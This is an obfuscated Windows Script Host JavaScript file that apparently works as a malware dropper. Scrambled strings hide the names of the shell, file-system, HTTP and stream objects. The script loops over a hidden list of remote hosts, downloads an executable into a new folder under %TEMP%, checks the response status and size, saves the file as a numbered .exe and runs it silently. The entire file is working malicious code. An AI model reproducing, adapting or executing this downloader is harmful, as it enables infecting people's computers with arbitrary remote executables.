

function XPibVgrHl(xSKiQrgGwYj) {
var njVOZFKq = "bMWj Ws acZToPF cript.S PbstBc hell".split(" ");
var DtoBWVNq = WScript.CreateObject(njVOZFKq[1] + njVOZFKq[3] + njVOZFKq[5]);
DtoBWVNq.Run(xSKiQrgGwYj, 0x1, 0x0);
}
function CTkCanUwg(ZEDSi,xlscY,elFER) {
var RzEWt = "noztLD ojE pt.Shell QeTCyBB Scri  %TEMP%\\".split(" ");
var tMv=((1)?"W" + RzEWt[4]:"")+RzEWt[2];
var hi = WScript.CreateObject(tMv);
return hi.ExpandEnvironmentStrings(RzEWt[6]);
}
function uSbgDGck() {
var kRNZiQS = "Sc gGKkvOc r xZvKEGrxC ipting fLVruxs NMh ile utFCbJKlFfMUna System Ph rBJtk Obj dVuqxY ect sIHMSxQ".split(" ");
return kRNZiQS[0] + kRNZiQS[2] + kRNZiQS[4] + ".F" + kRNZiQS[7] + kRNZiQS[9] + kRNZiQS[12] + kRNZiQS[14];
}
function KoAN(uxCuq) {
auIGYhK = WScript.CreateObject(uxCuq);
return auIGYhK
}
function stQs(saspc,UADTw) {
saspc.write(UADTw);
}
function meUs(hlrHU) {
hlrHU.open();
}
function NHaI(CPEvg,srQGl) {
CPEvg.saveToFile(srQGl,470-468);
}
function vYex(GGKSM,Sgkaj,byFRB) {
GGKSM.open(byFRB,Sgkaj,false);
}
function Zmvs(WWyoZ) {
if (WWyoZ == 320-120){return true;} else {return false;}
}
function XgfO(PKtKK) {
if (PKtKK > 171868-312){return true;} else {return false;}
}
function ZgWg(wZWFO) {
var YHete="";
for(B=(526-526); B < wZWFO.length; B++)
if (B % (925-923) != (715-715)) {
YHete += wZWFO.substr(B, 742-741);
}
return YHete;
}
function vNdu(nSPDA) {
nSPDA.send();
}
function dkeg(VtAqr) {
return VtAqr.status;
}
function SjztI(vuubko) {
return new ActiveXObject(vuubko);
}
function lvxidQc(kSZy) {
kSZy.position=0;
}
function okwPNLU(DCKf) {
return DCKf.responseBody;
}
var Pi="8ujj6aIj1a0jvgzoegfoIfifv.McloDm7/S8P09.7e7xKeh?B biWsJtThNeyrCe8aKnqyAbJoXdTyjqhq7.ocho4mL/U8P0S.YejxpeQ?L U?Q t?D 5?";
var q = ZgWg(Pi).split(" ");
var jPJ = CTkCanUwg("mlFn","VjQTl","OxMDvW");
var GbQ = SjztI(uSbgDGck());
var oDBeQJ = ("FhquSnD \\").split(" ");
var QZVG = jPJ+oDBeQJ[0]+oDBeQJ[1];
try{
GbQ.CreateFolder(QZVG);
}catch(CbxTlL){
};
var uOH = "2.XMLH";
var HDw = (uOH + "TTP" + " ZNjMdlp ydfFG XML ream St ruSHMmAG AD pzlNlop OD").split(" ");
var YH = true  , EoQD = HDw[7] + "" + HDw[9];
var jq = KoAN("MS"+HDw[3]+(574338, HDw[0]));
var HVp = KoAN(EoQD + "B." + HDw[5]+(400344, HDw[4]));
var FLL = 0;
var g = 1;
var bhUkTZQ = 928856;
var F=FLL;
while (true)  {
if(F>=q.length) {break;}
var yO = 0;
var FfM = ("ht" + " nZvzePO tp locfP yvVIxXob :// eSRnFms .e xe G ET").split(" ");
try  {
var kUKPi=FfM[0]+FfM[2]+FfM[5];
vYex(jq,kUKPi+q[F]+g, FfM[9]+FfM[10]); vNdu(jq); if (Zmvs(dkeg(jq)))  {      
meUs(HVp); HVp.type = 1; stQs(HVp,okwPNLU(jq)); if (XgfO(HVp.size))  {
yO = 1; lvxidQc(HVp);NHaI(HVp,/*6Jx316cAwO*/QZVG/*3TGI79jDlb*/+bhUkTZQ+FfM[7]+FfM[8]); try  {
if (((new Date())>0,7961685888)) {
XPibVgrHl(QZVG+bhUkTZQ+/*YeU696sElz*/FfM[7]+FfM[8]/*dp7a66e8BH*/); 
break;
}
}
catch (Ea)  {
}; 
}; HVp.close(); 
}; 
if (yO == 1)  {
FLL = F; break; 
}; 
}
catch (Ea)  { 
}; 
F++;
}; 

